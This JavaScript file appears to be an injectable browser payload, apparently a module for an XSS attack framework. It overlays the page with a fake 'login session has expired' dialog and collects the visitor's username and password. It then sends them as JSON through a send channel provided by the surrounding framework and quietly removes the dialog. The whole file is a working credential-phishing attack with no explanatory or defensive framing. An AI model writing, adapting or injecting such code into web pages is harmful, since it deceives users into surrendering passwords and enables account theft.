var $_$self = this;
(function(self){
	var body = document.querySelector('body'),
		cnt = document.createElement('div');
		cnt.style.width = "100%";
		cnt.style.height = "100%";
		cnt.style.position = "fixed";
		cnt.style.backgroundColor = "#000";
		cnt.style.opacity = "0.5";
		cnt.style.left = "0";
		cnt.style.top = "0";
		cnt.style.zIndex = "10000";
		//cnt.style. = "";
	
	var modal = document.createElement('div'),
		mw = 450,
		mh = 300;
		modal.style.width = mw+"px";
		modal.style.height = mh+"px";
		modal.style.backgroundColor = "#fff";
		modal.style.left = ((window.innerWidth/2)-(mw/2))+"px";
		modal.style.top = ((window.innerHeight/2)-(mh/2))+"px";
		modal.style.position = "fixed";
		modal.style.zIndex = "10001";
		//modal.style. = "";
	
	var modalMsg = document.createElement('div'),
		mmw = 350;
		modalMsg.style.width = mmw+'px';
		modalMsg.style.left = ((mw/2)-(mmw/2))+"px";
		modalMsg.style.top = '35px';
		modalMsg.style.position = 'absolute';
		//modalMsg.style. = '';
		modalMsg.innerHTML = "Your login session has expired. Please login again to continue.";

	var login = document.createElement('div'),
		lw = 160,
		lh = 135,
		lpad = 10;
		login.style.width = lw+"px";
		login.style.height = lh+"px";
		login.style.position = "absolute";
		login.style.padding = lpad+"px";
		login.style.left = ((mw/2)-(lw/2)-lpad)+"px";
		login.style.top = ((mh/2)-(lh/2)-lpad+23)+"px";
		login.style.backgroundColor = "#ccc";
		modal.style.zIndex = "10002";

	var userLabel = document.createElement('label'),
		passLabel = document.createElement('label'),
		userIn = document.createElement('input'),
		passIn = document.createElement('input'),
		userCnt = document.createElement('div'),
		passCnt = document.createElement('div'),
		submitBtn = document.createElement('div');

	userCnt.style.marginBottom = "8px";
	passCnt.style.marginBottom = "8px";

	submitBtn.style.padding = "10px";
	submitBtn.style.width = (lw-20)+"px";
	submitBtn.style.height = "15px";
	submitBtn.style.backgroundColor = "#f4a733";
	submitBtn.style.textAlign = "center";
	submitBtn.style.cursor = "pointer";
	submitBtn.innerHTML = "Login";

	userLabel.innerHTML = 'Username:';
	passLabel.innerHTML = 'Password:';

	userIn.type = 'text';
	userIn.style.width = (lw-4)+'px';

	passIn.type = 'password';
	passIn.style.width = (lw-4)+'px';

	userLabel.appendChild(userIn);
	passLabel.appendChild(passIn);

	userCnt.appendChild(userLabel);
	passCnt.appendChild(passLabel);

	login.appendChild(userCnt);
	login.appendChild(passCnt);
	login.appendChild(submitBtn);

	modal.appendChild(modalMsg);
	modal.appendChild(login);
	body.appendChild(modal);
	body.appendChild(cnt);

	submitBtn.addEventListener('click', function(){
		var user = userIn.value,
			pass = passIn.value;

		if(user.length == 0){
			userLabel.style.color = "red";
		}else{
			userLabel.style.color = "#000";
		}

		if(pass.length == 0) {
			passLabel.style.color = "red";
		}else{
			passLabel.style.color = "#000";
		}

		if(user.length == 0 || pass.length == 0){
			return;
		}

		self.send(JSON.stringify({
			username: user,
			password: pass
		}));

		setTimeout(function(){
			body.removeChild(cnt);
			body.removeChild(modal);
		}, 500);
	});
})($_$self);